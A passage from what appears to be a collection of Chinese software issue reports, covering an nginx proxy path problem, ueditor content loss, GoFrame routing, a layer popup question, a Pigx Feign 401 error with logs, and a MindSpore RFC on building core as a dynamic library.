E -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. E -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 E -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. E -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 E -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 E -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. E -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 E -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. E -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 E -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 E -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. E -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 E -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. E -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 E -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 E -2.9 -3. -2.8 -3. -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. E -2.9 -2.8 -2.7 -2.8 -3. -2.9 -2.9 -3. -2.8 -3. -2.9 -2.8] E data_me_error:[ 2.7298869e+15 1.2822661e+15 -1.8436022e+15 -3.2755924e+14 E -3.4493433e+14 -1.8829312e+15 1.3126305e+15 -1.8740915e+15 E -3.3077667e+14 1.2791658e+15 2.7738109e+15 1.3028974e+15 E -1.8732649e+15 -3.3282943e+14 -3.5048410e+14 -1.9132274e+15 E 1.3337485e+15 -1.9042469e+15 -3.3609894e+14 1.2997464e+15 E 2.6279920e+15 1.2344058e+15 -1.7747875e+15 -3.1533318e+14 E -3.3205996e+14 -1.8126542e+15 1.2636347e+15 -1.8041428e+15 E -3.1843079e+14 1.2314219e+15 2.7023258e+15 1.2693208e+15 E -1.8249890e+15 -3.2425235e+14 -3.4145225e+14 -1.8639227e+15 E 1.2993777e+15 -1.8551729e+15 -3.2743750e+14 1.2662530e+15 E 2.7750780e+15 1.3034949e+15 -1.8741225e+15 -3.3298214e+14 E -3.5064475e+14 -1.9141045e+15 1.3343608e+15 -1.9051182e+15 E -3.3625289e+14 1.3003428e+15 2.7792545e+15 1.3054548e+15 E -1.8769429e+15 -3.3348250e+14 -3.5117263e+14 -1.9169868e+15 E 1.3363678e+15 -1.9079826e+15 -3.3675902e+14 1.3022996e+15 E 2.8484473e+15 1.3379549e+15 -1.9236674e+15 -3.4178548e+14 E -3.5991504e+14 -1.9647113e+15 1.3696380e+15 -1.9554834e+15 E -3.4514267e+14 1.3347216e+15 2.7383310e+15 1.2862340e+15 E -1.8493026e+15 -3.2857248e+14 -3.4600220e+14 -1.8887592e+15 E 1.3166905e+15 -1.8798896e+15 -3.3180042e+14 1.2831256e+15 E 2.7985355e+15 1.3145142e+15 -1.8899648e+15 -3.3579648e+14 E -3.5360939e+14 -1.9302849e+15 1.3456392e+15 -1.9212209e+15 E -3.3909512e+14 1.3113350e+15 2.8134516e+15 1.3215161e+15 E -1.9000335e+15 -3.3758601e+14 -3.5549327e+14 -1.9405725e+15 E 1.3528095e+15 -1.9314579e+15 -3.4090236e+14 1.3183216e+15 E 2.7759574e+15 1.3039066e+15 -1.8747146e+15 -3.3308757e+14 E -3.5075632e+14 -1.9147125e+15 1.3347844e+15 -1.9057238e+15 E -3.3635986e+14 1.3007553e+15 2.6925732e+15 1.2647398e+15 E -1.8184043e+15 -3.2308197e+14 -3.4022030e+14 -1.8571997e+15 E 1.2946894e+15 -1.8484769e+15 -3.2625568e+14 1.2616833e+15 E 2.8078306e+15 1.3188778e+15 -1.8962372e+15 -3.3691210e+14 E -3.5478319e+14 -1.9366966e+15 1.3501075e+15 -1.9275998e+15 E -3.4022137e+14 1.3156882e+15 2.7552022e+15 1.2941578e+15 E -1.8606974e+15 -3.3059689e+14 -3.4813320e+14 -1.9003944e+15 E 1.3248032e+15 -1.8914735e+15 -3.3384462e+14 1.2910297e+15 E 2.7998932e+15 1.3151495e+15 -1.8908785e+15 -3.3595942e+14 E -3.5378045e+14 -1.9312184e+15 1.3462901e+15 -1.9221529e+15 E -3.3925937e+14 1.3119701e+15 2.7417498e+15 1.2878396e+15 E -1.8516130e+15 -3.2898285e+14 -3.4643377e+14 -1.8911162e+15 E 1.3183355e+15 -1.8822394e+15 -3.3221475e+14 1.2847269e+15 E 2.7156517e+15 1.2755803e+15 -1.8339883e+15 -3.2585118e+14 E -3.4313588e+14 -1.8731138e+15 1.3057845e+15 -1.8643191e+15 E -3.2905231e+14 1.2724956e+15 2.7977828e+15 1.3141584e+15 E -1.8894554e+15 -3.3570609e+14 -3.5351383e+14 -1.9297644e+15 E 1.3452773e+15 -1.9207024e+15 -3.3900382e+14 1.3109817e+15 E 2.7018923e+15 1.2691176e+15 -1.8246959e+15 -3.2420041e+14 E -3.4139766e+14 -1.8636260e+15 1.2991699e+15 -1.8548765e+15 E -3.2738532e+14 1.2660476e+15 2.7864403e+15 1.3088318e+15 E -1.8817924e+15 -3.3434492e+14 -3.5208085e+14 -1.9219402e+15 E 1.3398240e+15 -1.9129191e+15 -3.3762943e+14 1.3056654e+15 E 2.7550736e+15 1.2940969e+15 -1.8606082e+15 -3.3058159e+14 E -3.4811713e+14 -1.9003047e+15 1.3247401e+15 -1.8913852e+15 E -3.3382885e+14 1.2909689e+15 2.7587488e+15 1.2958221e+15 E -1.8630902e+15 -3.3102189e+14 -3.4858132e+14 -1.9028406e+15 E 1.3265067e+15 -1.8939034e+15 -3.3427415e+14 1.2926887e+15 E 2.6769541e+15 1.2574039e+15 -1.8078547e+15 -3.2120826e+14 E -3.3824669e+14 -1.8464243e+15 1.2871789e+15 -1.8377545e+15 E -3.2436382e+14 1.2543651e+15 2.7048593e+15 1.2705108e+15 E -1.8266970e+15 -3.2455585e+14 -3.4177189e+14 -1.8656695e+15 E 1.3005953e+15 -1.8569095e+15 -3.2774389e+14 1.2674380e+15 E 2.7434836e+15 1.2886522e+15 -1.8527827e+15 -3.2919065e+14 E -3.4665251e+14 -1.8923106e+15 1.3191669e+15 -1.8834262e+15 E -3.3242433e+14 1.2855383e+15 2.7464399e+15 1.2900428e+15 E -1.8547810e+15 -3.2954579e+14 -3.4702651e+14 -1.8943518e+15 E 1.3205910e+15 -1.8854566e+15 -3.3278313e+14 1.2869251e+15 E 2.7153760e+15 1.2754501e+15 -1.8338002e+15 -3.2581840e+14 E -3.4310168e+14 -1.8729268e+15 1.3056527e+15 -1.8641328e+15 E -3.2901872e+14 1.2723672e+15 2.8323038e+15 1.3303735e+15 E -1.9127652e+15 -3.3984825e+14 -3.5787583e+14 -1.9535751e+15 E 1.3618766e+15 -1.9444010e+15 -3.4318658e+14 1.3271568e+15 E 2.7500453e+15 1.2917356e+15 -1.8572138e+15 -3.2997841e+14 E -3.4748198e+14 -1.8968396e+15 1.3223229e+15 -1.8879329e+15 E -3.3321977e+14 1.2886126e+15 2.7836518e+15 1.3075232e+15 E -1.8799096e+15 -3.3401092e+14 -3.5172856e+14 -1.9200200e+15 E 1.3384833e+15 -1.9110034e+15 -3.3729180e+14 1.3043602e+15 E 2.8071039e+15 1.3185390e+15 -1.8957494e+15 -3.3682499e+14 E -3.5469192e+14 -1.9361981e+15 1.3497588e+15 -1.9271036e+15 E -3.4013379e+14 1.3153490e+15 2.8441061e+15 1.3359178e+15 E -1.9207411e+15 -3.4126451e+14 -3.5936713e+14 -1.9617175e+15 E 1.3675522e+15 -1.9525064e+15 -3.4461724e+14 1.3326885e+15] E loss:[2.7298869e+15 1.2822661e+15 1.8436022e+15 3.2755924e+14 3.4493433e+14 E 1.8829312e+15 1.3126305e+15 1.8740915e+15 3.3077667e+14 1.2791658e+15 E 2.7738109e+15 1.3028974e+15 1.8732649e+15 3.3282943e+14 3.5048410e+14 E 1.9132274e+15 1.3337485e+15 1.9042469e+15 3.3609894e+14 1.2997464e+15 E 2.6279920e+15 1.2344058e+15 1.7747875e+15 3.1533318e+14 3.3205996e+14 E 1.8126542e+15 1.2636347e+15 1.8041428e+15 3.1843079e+14 1.2314219e+15 E 2.7023258e+15 1.2693208e+15 1.8249890e+15 3.2425235e+14 3.4145225e+14 E 1.8639227e+15 1.2993777e+15 1.8551729e+15 3.2743750e+14 1.2662530e+15 E 2.7750780e+15 1.3034949e+15 1.8741225e+15 3.3298214e+14 3.5064475e+14 E 1.9141045e+15 1.3343608e+15 1.9051182e+15 3.3625289e+14 1.3003428e+15 E 2.7792545e+15 1.3054548e+15 1.8769429e+15 3.3348250e+14 3.5117263e+14 E 1.9169868e+15 1.3363678e+15 1.9079826e+15 3.3675902e+14 1.3022996e+15 E 2.8484473e+15 1.3379549e+15 1.9236674e+15 3.4178548e+14 3.5991504e+14 E 1.9647113e+15 1.3696380e+15 1.9554834e+15 3.4514267e+14 1.3347216e+15 E 2.7383310e+15 1.2862340e+15 1.8493026e+15 3.2857248e+14 3.4600220e+14 E 1.8887592e+15 1.3166905e+15 1.8798896e+15 3.3180042e+14 1.2831256e+15 E 2.7985355e+15 1.3145142e+15 1.8899648e+15 3.3579648e+14 3.5360939e+14 E 1.9302849e+15 1.3456392e+15 1.9212209e+15 3.3909512e+14 1.3113350e+15 E 2.8134516e+15 1.3215161e+15 1.9000335e+15 3.3758601e+14 3.5549327e+14 E 1.9405725e+15 1.3528095e+15 1.9314579e+15 3.4090236e+14 1.3183216e+15 E 2.7759574e+15 1.3039066e+15 1.8747146e+15 3.3308757e+14 3.5075632e+14 E 1.9147125e+15 1.3347844e+15 1.9057238e+15 3.3635986e+14 1.3007553e+15 E 2.6925732e+15 1.2647398e+15 1.8184043e+15 3.2308197e+14 3.4022030e+14 E 1.8571997e+15 1.2946894e+15 1.8484769e+15 3.2625568e+14 1.2616833e+15 E 2.8078306e+15 1.3188778e+15 1.8962372e+15 3.3691210e+14 3.5478319e+14 E 1.9366966e+15 1.3501075e+15 1.9275998e+15 3.4022137e+14 1.3156882e+15 E 2.7552022e+15 1.2941578e+15 1.8606974e+15 3.3059689e+14 3.4813320e+14 E 1.9003944e+15 1.3248032e+15 1.8914735e+15 3.3384462e+14 1.2910297e+15 E 2.7998932e+15 1.3151495e+15 1.8908785e+15 3.3595942e+14 3.5378045e+14 E 1.9312184e+15 1.3462901e+15 1.9221529e+15 3.3925937e+14 1.3119701e+15 E 2.7417498e+15 1.2878396e+15 1.8516130e+15 3.2898285e+14 3.4643377e+14 E 1.8911162e+15 1.3183355e+15 1.8822394e+15 3.3221475e+14 1.2847269e+15 E 2.7156517e+15 1.2755803e+15 1.8339883e+15 3.2585118e+14 3.4313588e+14 E 1.8731138e+15 1.3057845e+15 1.8643191e+15 3.2905231e+14 1.2724956e+15 E 2.7977828e+15 1.3141584e+15 1.8894554e+15 3.3570609e+14 3.5351383e+14 E 1.9297644e+15 1.3452773e+15 1.9207024e+15 3.3900382e+14 1.3109817e+15 E 2.7018923e+15 1.2691176e+15 1.8246959e+15 3.2420041e+14 3.4139766e+14 E 1.8636260e+15 1.2991699e+15 1.8548765e+15 3.2738532e+14 1.2660476e+15 E 2.7864403e+15 1.3088318e+15 1.8817924e+15 3.3434492e+14 3.5208085e+14 E 1.9219402e+15 1.3398240e+15 1.9129191e+15 3.3762943e+14 1.3056654e+15 E 2.7550736e+15 1.2940969e+15 1.8606082e+15 3.3058159e+14 3.4811713e+14 E 1.9003047e+15 1.3247401e+15 1.8913852e+15 3.3382885e+14 1.2909689e+15 E 2.7587488e+15 1.2958221e+15 1.8630902e+15 3.3102189e+14 3.4858132e+14 E 1.9028406e+15 1.3265067e+15 1.8939034e+15 3.3427415e+14 1.2926887e+15 E 2.6769541e+15 1.2574039e+15 1.8078547e+15 3.2120826e+14 3.3824669e+14 E 1.8464243e+15 1.2871789e+15 1.8377545e+15 3.2436382e+14 1.2543651e+15 E 2.7048593e+15 1.2705108e+15 1.8266970e+15 3.2455585e+14 3.4177189e+14 E 1.8656695e+15 1.3005953e+15 1.8569095e+15 3.2774389e+14 1.2674380e+15 E 2.7434836e+15 1.2886522e+15 1.8527827e+15 3.2919065e+14 3.4665251e+14 E 1.8923106e+15 1.3191669e+15 1.8834262e+15 3.3242433e+14 1.2855383e+15 E 2.7464399e+15 1.2900428e+15 1.8547810e+15 3.2954579e+14 3.4702651e+14 E 1.8943518e+15 1.3205910e+15 1.8854566e+15 3.3278313e+14 1.2869251e+15 E 2.7153760e+15 1.2754501e+15 1.8338002e+15 3.2581840e+14 3.4310168e+14 E 1.8729268e+15 1.3056527e+15 1.8641328e+15 3.2901872e+14 1.2723672e+15 E 2.8323038e+15 1.3303735e+15 1.9127652e+15 3.3984825e+14 3.5787583e+14 E 1.9535751e+15 1.3618766e+15 1.9444010e+15 3.4318658e+14 1.3271568e+15 E 2.7500453e+15 1.2917356e+15 1.8572138e+15 3.2997841e+14 3.4748198e+14 E 1.8968396e+15 1.3223229e+15 1.8879329e+15 3.3321977e+14 1.2886126e+15 E 2.7836518e+15 1.3075232e+15 1.8799096e+15 3.3401092e+14 3.5172856e+14 E 1.9200200e+15 1.3384833e+15 1.9110034e+15 3.3729180e+14 1.3043602e+15 E 2.8071039e+15 1.3185390e+15 1.8957494e+15 3.3682499e+14 3.5469192e+14 E 1.9361981e+15 1.3497588e+15 1.9271036e+15 3.4013379e+14 1.3153490e+15 E 2.8441061e+15 1.3359178e+15 1.9207411e+15 3.4126451e+14 3.5936713e+14 E 1.9617175e+15 1.3675522e+15 1.9525064e+15 3.4461724e+14 1.3326885e+15] ../share/utils.py:15: AssertionError"
nginx代理问题,版本 nginx 外网域名：www.test.cn 假如我有一个接口：http://localhost:8001/web/rest/gettestinfo 外网访问时 访问：http://www.test.cn/web_test_server_1/doc.html 可以正常访问 但是里面的调试接口地址不正确：/web/rest/gettestinfo 需要手动修改成才正确：/web_test_server_1/rest/gettestinfo 这样接口一多，调试太麻烦，能不能有什么配置能够解决这种问题？   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/dependency&gt; location /web_test_server_1/ { proxy_pass http://localhost:8001/web }
发表文章时ueditor中内容没有提交到后台，数据丢失,"发表文章时ueditor中使用html模式时输入如下内容： 点击立即提交，再回去看内容是没有的 如果内容再输入几个文字又可以提交成功的，下面内容可以正常提交： 看看是什么原因   <code>: &lt;p&gt; &lt;video class=""edui-upload-video video-js vjs-default-skin video-js"" controls="""" preload=""none"" width=""420"" height=""280"" src=""/uploads/videos/20201104/d0e89eaba2596b917fbfa25bfcd97f9c.mp4"" data-setup=""{}""&gt; &lt;source src=""/uploads/videos/20201104/d0e89eaba2596b917fbfa25bfcd97f9c.mp4"" type=""video/mp4""/&gt; &lt;/video&gt; &lt;/p&gt; &lt;p&gt; &lt;video class=""edui-upload-video video-js vjs-default-skin video-js"" controls="""" preload=""none"" width=""420"" height=""280"" src=""/uploads/videos/20201104/d0e89eaba2596b917fbfa25bfcd97f9c.mp4"" data-setup=""{}""&gt; &lt;source src=""/uploads/videos/20201104/d0e89eaba2596b917fbfa25bfcd97f9c.mp4"" type=""video/mp4""/&gt; &lt;/video&gt; &lt;/p&gt; &lt;p&gt; kljsdfaf &lt;/p&gt;"
goframe的路由识别,"1. 您当前使用的版本 2. 您当前使用的框架版本？ 1.9.2 3. 更新到最新的框架版本是否能够解决问题？ 无法 4. 问题描述？ 路由里面绑定的/test.html，但是访问/test.html#12345，注意这里是""井""不是get请求的?，也是正常可以访问的，但是看路由请求的url，还是/test.html，如果可以 1.框架帮拦截掉，不要适配这个test.html，否则很影响seo的 2.提供获取全部url的方法,我们自己截取来判断吧 5. 您期望得到的结果？ 框架帮拦截掉 6. 您实际得到的结果？   <code>: go 1.12, linux/amd64"
请问layer怎么调用弹出层里面的js方法？,在A页面通过 方法打开了一个页面弹窗（B页面），现在需要在按钮回调方法里面调用B页面中的方法，请问应该怎么做呢？   <code>: top.layer.open()
Pigx使用Feign内部调用401,"问题重现 1、使用管理员（admin）在管理后台登录后，拿到 accessToken。 2、调用 pigx-upms 模块里的 TestController 的 info 方法 上面的 pigx-user 模块是我新建的。 3、查看 upms 控制台，发现如下日志 如上日志可以看出 1、用户token没有问题，因为在 upms 里面已经打印出是 admin 2、成功调用了 pigx-user 模块，证明路由配置的没有问题。 3、打印出了 401 1、文字描述：https://shimo.im/docs/1MlnUI8bNC42RvMg/ 2、工程代码在 pig. vip QQ群文件里，名字是 test-pigx.zip 。 工程代码是最新的master分支，并且做了如下更改：   <code>: @GetMapping(""/info"") public String info() { log.info(""=============== Pigx-upms-biz =================""); log.info(""当前登录的用户是: {}"", SecurityUtils.getUser().toString()); log.info(""开始调用 pigx-user 模块""); testUserService.info(); return ""ok""; } 2018-09-05 15:55:49.527 INFO 10950 --- [ XNIO-2 task-2] c.p.p.admin.controller.TestController : =============== Pigx-upms-biz ================= 2018-09-05 15:55:49.529 INFO 10950 --- [ XNIO-2 task-2] c.p.p.admin.controller.TestController : 当前登录的用户是: com.pig4cloud.pigx.common.security.service.PigxUser@586034f: Username: admin; Password: [PROTECTED]; Enabled: true; AccountNonExpired: true; credentialsNonExpired: true; AccountNonLocked: true; Granted Authorities: 1,ROLE_ROLE_ADMIN,daemon_statustracelog_del,generator_syssocialdetails_add,generator_syssocialdetails_edit,sys_client_add,sys_client_del,sys_client_edit,sys_dept_add,sys_dept_del,sys_dept_edit,sys_dict_add,sys_dict_del,sys_dict_edit,sys_log_del,sys_menu_add,sys_menu_del,sys_menu_edit,sys_role_add,sys_role_del,sys_role_edit,sys_role_perm,sys_user_add,sys_user_del,sys_user_edit 2018-09-05 15:55:49.529 INFO 10950 --- [ XNIO-2 task-2] c.p.p.admin.controller.TestController : 开始调用 pigx-user 模块 2018-09-05 15:55:51.422 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] ---&gt; GET http://pigx-user/user/info HTTP/1.1 2018-09-05 15:55:51.423 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] ---&gt; END HTTP (0-byte body) 2018-09-05 15:55:51.425 INFO 10950 --- [ XNIO-2 task-2] s.c.a.AnnotationConfigApplicationContext : Refreshing SpringClientFactory-pigx-user: startup date [Wed Sep 05 15:55:51 CST 2018]; parent: org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext@4346808 2018-09-05 15:55:51.504 INFO 10950 --- [ XNIO-2 task-2] f.a.AutowiredAnnotationBeanPostProcessor : JSR-330 'javax.inject.Inject' annotation found and supported for autowiring 2018-09-05 15:55:51.602 INFO 10950 --- [ XNIO-2 task-2] c.netflix.config.ChainedDynamicProperty : Flipping property: pigx-user.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 2018-09-05 15:55:51.612 INFO 10950 --- [ XNIO-2 task-2] c.n.u.concurrent.ShutdownEnabledTimer : Shutdown hook installed for: NFLoadBalancer-PingTimer-pigx-user 2018-09-05 15:55:51.612 INFO 10950 --- [ XNIO-2 task-2] c.netflix.loadbalancer.BaseLoadBalancer : Client: pigx-user instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=pigx-user,current list of Servers=[],Load balancer stats=Zone stats: {},Server stats: []}ServerList:null 2018-09-05 15:55:51.613 INFO 10950 --- [ XNIO-2 task-2] c.n.l.DynamicServerListLoadBalancer : Using serverListUpdater PollingServerListUpdater 2018-09-05 15:55:51.614 INFO 10950 --- [ XNIO-2 task-2] c.netflix.config.ChainedDynamicProperty : Flipping property: pigx-user.ribbon.ActiveConnectionsLimit to use NEXT property: niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647 2018-09-05 15:55:51.616 INFO 10950 --- [ XNIO-2 task-2] c.n.l.DynamicServerListLoadBalancer : DynamicServerListLoadBalancer for client pigx-user initialized: DynamicServerListLoadBalancer:{NFLoadBalancer:name=pigx-user,current list of Servers=[192.168.2.60:8811],Load balancer stats=Zone stats: {defaultzone=[Zone:defaultzone; Instance count:1; Active connections count: 0; Circuit breaker tripped count: 0; Active connections per server: 0.0;] },Server stats: [[Server:192.168.2.60:8811; Zone:defaultZone; Total Requests:0; Successive connection failure:0; Total blackout seconds:0; Last connection made:Thu Jan 01 08:00:00 CST 1970; First connection made: Thu Jan 01 08:00:00 CST 1970; Active Connections:0; total failure count in last (1000) msecs:0; average resp time:0.0; 90 percentile resp time:0.0; 95 percentile resp time:0.0; min resp time:0.0; max resp time:0.0; stddev resp time:0.0] ]}ServerList:org.springframework.cloud.netflix.ribbon.eureka.DomainExtractingServerList@1b9694cc 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] &lt;--- HTTP/1.1 401 Unauthorized (257ms) 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] cache-control: no-cache, no-store, max-age=0, must-revalidate 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] connection: keep-alive 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] content-length: 91 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] content-type: application/json;charset=utf-8 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] date: Wed, 05 Sep 2018 07:55:51 GMT 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] expires: 0 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] pragma: no-cache 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] x-content-type-options: nosniff 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] x-frame-options: DENY 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] x-xss-protection: 1; mode=block 2018-09-05 15:55:51.681 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] 2018-09-05 15:55:51.682 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] {""msg"":""error"",""code"":401,""data"":""Full authentication is required to access this resource""} 2018-09-05 15:55:51.682 DEBUG 10950 --- [ XNIO-2 task-2] n.x.ooo.user.api.feign.TestUserService : [TestUserService#info] &lt;--- END HTTP (91-byte body) 2018-09-05 15:55:51.686 ERROR 10950 --- [ XNIO-2 task-2] .x.o.u.a.f.f.TestUserServiceFallbackImpl : feign 查询用户信息失败 eureka 的端口在我电脑上和别的服务冲突，我改成了 8761 redis的host，我改成了localhost_redis mysql 的密码我改了"
【STABLE】【架构解耦】按照组件划分，调整后端代码目录和编译工程脚本；core动态化,"RFC Describe the status of the problem you wish to solve Attach the relevant issue if have core动态化 方案 去除gvar.so 打开所需符号的可见性，解决符号找不到的问题 整改头文件实现的单例，解决单例数据不互通的问题 整改头文件定义的全局变量，解决全局变量各有一份和重复符号double free的问题 修改ut构建，直接将core的源码编进ut_tests可执行文件中 打开可见性的符号 整改的单例列表 整改的全局变量列表 #I4RTT0:mindspore-core编译为动态库 抽取common库 抽取前后端公共部分编译为动态库libmindspore_common.so，大致范围是原ccsrc/common、ccsrc/utils、ccsrc/transform/graph_ir，并将该模块对其他组件提供的接口放进ccsrc/include/目录下。 除此之外还有以下细节改动： comm_manager：原本通过编译宏控制cpu/gpu/ascend版本编译出不同的comm_manager，现将comm_manager抽象虚基类放入common模块，各后端在plugin中具体实现 security_py: 为pybind11注册module，移到pybind_api ms_device_shape_transfer: 只有后端使用，移出common parallel/context: 后端使用也比较多，移入common anfalgo: 前后端均有较多使用，将不涉及后端数据结构的函数抽取到common中，允许前后端共用 parse/python_adapter: 前后端和common模块都有较多使用，抽取到common中 context_extends：调用者是pipeline或action，但实现逻辑硬件相关性很高，移出common debug（ir dump相关）: 按理来说应该放进common中，但相关代码与前端和后端都有很深的耦合，搞不定，暂时没搞 后端使用python 后端使用parallel context不合理，应当仅从graph上获取信息，已使用的应当逐步改进消除 comm manager应该是后端向前端提供的接口 Trail No. Task Description Related Issue(URL) 1 2   <code>: +MS_INTERNAL_API bool IsSubtype(const AbstractBasePtr x, const TypePtr model); +class MS_INTERNAL_API AbstractMonad : public AbstractBase { +class MS_INTERNAL_API AbstractUMonad final : public AbstractMonad { +class MS_INTERNAL_API AbstractIOMonad final : public AbstractMonad { +MS_INTERNAL_API std::string ExtractLoggingInfo(const std::string &amp;info); +MS_INTERNAL_API void SynchronizeSequenceNodesElementsUseFlags(const AnfNodeWeakPtrList &amp;lhs_sequence_nodes, +MS_INTERNAL_API void SynchronizeSequenceElementsUseFlagsRecursively(const AbstractSequencePtr &amp;lhs_sequence, +class MS_INTERNAL_API AnalysisContext { +MS_INTERNAL_API int64_t CheckAxis(const std::string &amp;op, const std::string &amp;arg_name, const ValuePtr &amp;axis, int64_t min, +MS_INTERNAL_API void CheckArgsSize(const std::string &amp;op, const AbstractBasePtrList &amp;args_spec_list, +MS_INTERNAL_API PrimitiveEvalImplMap &amp;GetPrimitiveToEvalImplMap(); +MS_INTERNAL_API PrimitiveEvalImplMap &amp;GetPrimitiveToBackendEvalImplMap(); +MS_INTERNAL_API StandardPrimitiveImplReg GetPrimitiveInferImpl(const PrimitivePtr &amp;primitive); +MS_INTERNAL_API std::set&lt;int64_t&gt; GetDependsFormMap(const CNodePtr &amp;cnode); +MS_INTERNAL_API void RegisterStandardPrimitiveImpl(const PrimitivePtr &amp;primitive, +MS_INTERNAL_API TypePtr TypeJoin(const TypePtr &amp;type1, const TypePtr &amp;type2); +MS_INTERNAL_API AbstractBasePtr AbstractJoin(const AbstractBasePtrList &amp;args_spec_list); +MS_INTERNAL_API AbstractBasePtrList AbstractJoin(const AbstractBasePtrList &amp;spec1, const AbstractBasePtrList &amp;spec2); +MS_INTERNAL_API AbstractBasePtr SensitivityTransform(const AbstractBasePtr &amp;spec); +MS_INTERNAL_API AbstractBasePtr MakeMonadAbstract(const MonadTypePtr &amp;type); +MS_INTERNAL_API AbstractBasePtr MakeAbstractTensor(const ShapePtr &amp;shape, const TypePtr &amp;type); +MS_INTERNAL_API iterator ConstIteratorCast(std::vector&lt;BaseRef&gt; *v, const_iterator iter); +class MS_INTERNAL_API VectorRef : public BaseRef { +class MS_INTERNAL_API SetRef : public BaseRef { +class MS_INTERNAL_API RunFunctionRef : public BaseRef { +MS_INTERNAL_API std::vector&lt;tensor::TensorPtr&gt; TransformVectorRefToMultiTensor(const VectorRef &amp;base_ref); +MS_INTERNAL_API std::string GetCNodeFuncName(CNodePtr cnode); +MS_INTERNAL_API FuncGraphPtr GetCNodeFuncGraph(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool IsPrimitiveCNode(const AnfNodePtr &amp;node, const PrimitivePtr &amp;value = nullptr); +MS_INTERNAL_API PrimitivePtr GetCNodePrimitive(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool IsPrimitiveEquals(const PrimitivePtr &amp;prim1, const PrimitivePtr &amp;prim2); +MS_INTERNAL_API size_t GetAbstractMonadNum(const AbstractBasePtrList &amp;args); +MS_INTERNAL_API bool HasAbstractMonad(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool HasAbstractUMonad(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool HasAbstractIOMonad(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool GetPrimitiveFlag(const PrimitivePtr &amp;prim, const std::string &amp;attr); +MS_INTERNAL_API EffectInfo GetPrimEffectInfo(const PrimitivePtr &amp;prim); +MS_INTERNAL_API bool IsStateEquivalent(const AnfNodePtr &amp;outer, const AnfNodePtr &amp;inner); +MS_INTERNAL_API size_t NewSeenGeneration(); +MS_INTERNAL_API std::string get_id(const AnfNodePtr &amp;node); +MS_INTERNAL_API void reset_id(); +MS_INTERNAL_API std::string GetCNodeTarget(const AnfNodePtr &amp;node); +MS_INTERNAL_API bool ContainMultiTarget(const std::vector&lt;AnfNodePtr&gt; &amp;nodes); +MS_INTERNAL_API void SetSequenceElementsUseFlags(const AbstractBasePtr &amp;abs, std::size_t 